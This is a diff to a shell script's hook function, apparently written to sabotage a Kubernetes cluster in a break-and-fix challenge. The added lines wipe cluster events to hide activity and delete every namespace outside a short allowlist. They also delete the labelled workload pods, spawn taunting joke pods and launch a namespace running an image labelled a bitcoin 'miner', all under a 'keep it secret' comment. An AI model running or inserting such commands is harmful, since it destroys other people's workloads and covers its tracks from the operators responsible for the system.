@@ -37,9 +37,36 @@ function hook() {
     # Keep it secret. Keep it safe.
     #
     # ----
-    kubectl delete all --all
+
     kubectl delete events --all
     kubectl delete events --all -n kube-system
+
+    # keep our boops but delete their boops
+    for ns in $(kubectl get ns -o jsonpath="{.items[*].metadata.name}"); do
+      if [ "$ns" = "kube-system" ] || [ "$ns" = "n0va" ] || [ "$ns" = "kube-public" ] || [ "$ns" = "default" ] || [ "$ns" = "kube-node-lease" ] || [ "$ns" = "cilium" ]  || [ "$ns" = "metallb-system" ]  || [ "$ns" = "rook-ceph" ]; then
+        continue
+      fi
+      # Delete all namespaces other than those ^
+      kubectl delete namespace $ns
+    done
+
+    # we know the workload had "klustered" labels so let's also fuck with those
+    kubectl delete po -l app=klustered --all-namespaces
+
+    # let's have fun in the default namespace
+    kubectl run "1--I-------------------------------I" --image busyboxy
+    kubectl run "1--I-------------------------------I" --image busyboxy
+    kubectl run "2--o-kris-n0va-is-a-professional---o" --image busyboxy
+    kubectl run "3--o-grown-up-business-computer----o" --image busyboxy
+    kubectl run "4--o-person-who-does-very-serious--o" --image busyboxy
+    kubectl run "5--o-computer-boops-for-her-career-o" --image busyboxy
+    kubectl run "6--o-------------------------------I" --image busyboxy
+    kubectl run "7--I------------n0va---------------I" --image busyboxy
+
+    # delete
+
+
+    # Here is our bitcoin "miner"
     kubectl create namespace n0va
     kubectl run n0va-0 --image krisnova/n0va -n n0va
     kubectl run n0va-1 --image krisnova/n0va -n n0va
